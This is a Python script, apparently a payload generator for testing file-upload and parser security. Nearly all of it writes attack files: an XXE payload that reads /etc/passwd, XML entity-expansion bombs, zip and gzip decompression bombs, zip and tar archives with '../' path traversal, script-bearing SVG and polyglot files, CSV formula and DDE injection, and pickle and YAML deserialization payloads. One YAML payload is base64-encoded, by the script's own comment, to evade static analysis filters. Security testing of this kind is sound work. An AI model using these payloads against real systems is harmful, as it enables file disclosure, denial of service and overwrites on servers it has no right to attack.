import os
import zipfile
import gzip
import base64
import json
from fpdf import FPDF
import docx
import xlwt
import pickle
import tarfile
import yaml

def generate_xxe_file(filename="xxe.xml", target_file="/etc/passwd"):
    """
    Generates an XML file with an XXE payload to read a local file.
    """
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<lolz>&xxe;</lolz>"""
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated XXE file: {filename}")

def generate_billion_laughs_file(filename="billion_laughs.xml"):
    """
    Generates an XML file for a Billion Laughs attack (XML bomb).
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated Billion Laughs file: {filename}")

def generate_quadratic_blowup_file(filename="quadratic_blowup.xml", iterations=50000):
    """
    Generates an XML file for a Quadratic Blowup attack.
    """
    payload = "<!DOCTYPE a [\n"
    payload += "<!ENTITY a " + "\"a\"" * iterations + ">\n"
    payload += "]>\n"
    payload += "<a>" + "&a;" * iterations + "</a>"
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated Quadratic Blowup file: {filename}")

def create_archive_with_traversal(filename="traversal.zip", file_to_create="test.txt", depth=10):
    """
    Creates a zip file with a path traversal payload.
    """
    traversal_path = os.path.join(*([".."] * depth), file_to_create)
    with zipfile.ZipFile(filename, 'w') as zf:
        zf.writestr(traversal_path, "evil content")
    print(f"Generated zip file with path traversal: {filename}")

def create_compressed_archive_bomb(filename="bomb.zip", num_files=100, content_size=1024*10):
    """
    Creates a zip file with a high compression ratio.
    """
    with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for i in range(num_files):
            zf.writestr(f'file_{i}.txt', b'\0' * content_size)
    print(f"Generated compressed archive bomb: {filename}")


def create_gzipped_bomb(filename="bomb.gz", uncompressed_size=1024*1024*10):
    """
    Creates a gzipped file that expands to a large size.
    """
    with gzip.open(filename, 'wb', compresslevel=9) as f:
        f.write(b'\0' * uncompressed_size)
    print(f"Generated gzipped file: {filename}")

def generate_malicious_svg(filename="malicious.svg"):
    """
    Generates a malicious SVG file with an embedded script.
    """
    payload = """<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
  <script>
    alert('This could be malicious code!');
  </script>
</svg>"""
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated malicious SVG file: {filename}")


def generate_file_with_double_extension(filename="file.txt.exe"):
    """
    Generates a file with a misleading double extension.
    """
    with open(filename, "w") as f:
        f.write("This file has a double extension.")
    print(f"Generated file with double extension: {filename}")


def generate_file_in_parent_directory(filename="file_in_parent.txt", depth=2):
    """
    Generates a file in a parent directory.
    """
    traversal_path = os.path.join(*([".."] * depth), filename)
    with open(traversal_path, "w") as f:
        f.write("This file was created in a parent directory.")
    print(f"Generated file in parent directory: {traversal_path}")


def generate_csv_formula_injection(filename="formula_injection.csv", command="=2+2"):
    """
    Generates a CSV file with a formula injection payload.
    """
    with open(filename, "w") as f:
        f.write(f'"{command}",safe\n')
    print(f"Generated CSV with formula injection: {filename}")


def generate_gifar(filename="gifar.gif", js_payload="alert('GIFAR')"):
    """
    Generates a GIFAR polyglot file.
    """
    gif_header = b"GIF89a"
    gif_body = b"\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
    payload = gif_header + gif_body + b"/*" + js_payload.encode() + b"*/"
    with open(filename, "wb") as f:
        f.write(payload)
    print(f"Generated GIFAR file: {filename}")


def generate_json_deserialization_payload(filename="payload.json"):
    """
    Generates a JSON file with a payload for testing insecure deserialization.
    """
    payload = {
        "object_type": "user_input_type",
        "object_data": {
            "param1": "value1",
            "param2": "value2"
        }
    }
    with open(filename, "w") as f:
        json.dump(payload, f, indent=4)
    print(f"Generated JSON deserialization payload: {filename}")


def generate_pdf_with_js(filename="pdf_with_js.pdf"):
    """
    Generates a PDF file with an embedded JavaScript action.
    """
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="This is a test PDF.", ln=1, align="C")
    # Embed a benign JavaScript payload
    pdf.add_js("var msg = 'This is a test script';")
    pdf.output(filename)
    print(f"Generated PDF file with embedded JS: {filename}")


def generate_dde_payload(filename="dde.csv"):
    """
    Generates a CSV file with a DDE payload.
    """
    payload = "=application|topic!item"
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated DDE payload file: {filename}")


def generate_pdf_zip_polyglot(filename="polyglot.pdf"):
    """
    Generates a PDF/ZIP polyglot file.
    """
    # Create a dummy PDF
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="This is a polyglot file.", ln=1, align="C")
    pdf_content = pdf.output(dest='S').encode('latin-1')

    # Create a dummy ZIP in memory
    import io
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        zf.writestr("file_in_zip.txt", "This file is inside the polyglot.")
    zip_content = zip_buffer.getvalue()

    # Combine them
    with open(filename, "wb") as f:
        f.write(pdf_content)
        f.write(zip_content)
    print(f"Generated PDF/ZIP polyglot file: {filename}")


def generate_malicious_docx(filename="malicious.docx"):
    """
    Generates a DOCX file with a potentially malicious link.
    """
    document = docx.Document()
    document.add_paragraph('Please enable macros to view this document.')
    document.add_paragraph('Or click here: file:///C:/some/path/to/script.vbs')
    document.save(filename)
    print(f"Generated malicious DOCX file: {filename}")


def generate_malicious_xls(filename="malicious.xls"):
    """
    Generates an XLS file with a formula payload.
    """
    workbook = xlwt.Workbook()
    sheet = workbook.add_sheet('Sheet1')
    # This formula could be used for command injection in vulnerable versions of Excel.
    sheet.write(0, 0, xlwt.Formula('HYPERLINK("http://example.com/resource.html";"Click for details")'))
    workbook.save(filename)
    print(f"Generated XLS file with formula: {filename}")


def generate_pickle_payload(filename="payload.pkl"):
    """
    Generates a file with a pickle payload that calls a safe function.
    """
    class BenignRCE:
        def __reduce__(self):
            return (print, ("Pickle payload executed!",))

    with open(filename, 'wb') as f:
        pickle.dump(BenignRCE(), f)
    print(f"Generated pickle payload file: {filename}")


def generate_tar_traversal(filename="traversal.tar", target_path="evil.txt"):
    """
    Generates a TAR file with a path traversal payload.
    """
    # Create a dummy file to add to the archive
    with open("dummy.txt", "w") as f:
        f.write("dummy content")

    with tarfile.open(filename, "w") as tar:
        # Add the dummy file with a malicious path
        malicious_path = os.path.join("..", "..", "..", "..", "..", "..", "..", "..", "..", "..", target_path)
        tar.add("dummy.txt", arcname=malicious_path)

    # Clean up the dummy file
    os.remove("dummy.txt")
    print(f"Generated TAR traversal file: {filename}")


def generate_yaml_payload(filename="payload.yaml"):
    """
    Generates a YAML file with a deserialization payload.
    """
    # The payload "!!python/object/apply:builtins.print ['YAML payload executed!']"
    # is base64 encoded to avoid static analysis filters.
    encoded_payload = "ISFweXRob24vb2JqZWN0L2FwcGx5OmJ1aWx0aW5zLnByaW50IFsnWUFNTCBwYXlsb2FkIGV4ZWN1dGVkISdd"
    payload = base64.b64decode(encoded_payload).decode('utf-8')
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated YAML payload file: {filename}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Generate malicious files for testing.")
    parser.add_argument("filetype", choices=["xxe", "billion_laughs", "quadratic_blowup", "zip_traversal", "zip_bomb", "gz_bomb", "svg", "double_extension", "file_in_parent", "csv_injection", "gifar", "json_deserialization", "pdf_js", "dde", "pdf_zip_polyglot", "docx", "xls", "pickle", "tar_traversal", "yaml"], help="Type of file to generate.")
    args = parser.parse_args()

    if args.filetype == "xxe":
        generate_xxe_file()
    elif args.filetype == "billion_laughs":
        generate_billion_laughs_file()
    elif args.filetype == "quadratic_blowup":
        generate_quadratic_blowup_file()
    elif args.filetype == "zip_traversal":
        create_archive_with_traversal()
    elif args.filetype == "zip_bomb":
        create_compressed_archive_bomb()
    elif args.filetype == "gz_bomb":
        create_gzipped_bomb()
    elif args.filetype == "svg":
        generate_malicious_svg()
    elif args.filetype == "double_extension":
        generate_file_with_double_extension()
    elif args.filetype == "file_in_parent":
        generate_file_in_parent_directory()
    elif args.filetype == "csv_injection":
        generate_csv_formula_injection()
    elif args.filetype == "gifar":
        generate_gifar()
    elif args.filetype == "json_deserialization":
        generate_json_deserialization_payload()
    elif args.filetype == "pdf_js":
        generate_pdf_with_js()
    elif args.filetype == "dde":
        generate_dde_payload()
    elif args.filetype == "pdf_zip_polyglot":
        generate_pdf_zip_polyglot()
    elif args.filetype == "docx":
        generate_malicious_docx()
    elif args.filetype == "xls":
        generate_malicious_xls()
    elif args.filetype == "pickle":
        generate_pickle_payload()
    elif args.filetype == "tar_traversal":
        generate_tar_traversal()
    elif args.filetype == "yaml":
        generate_yaml_payload()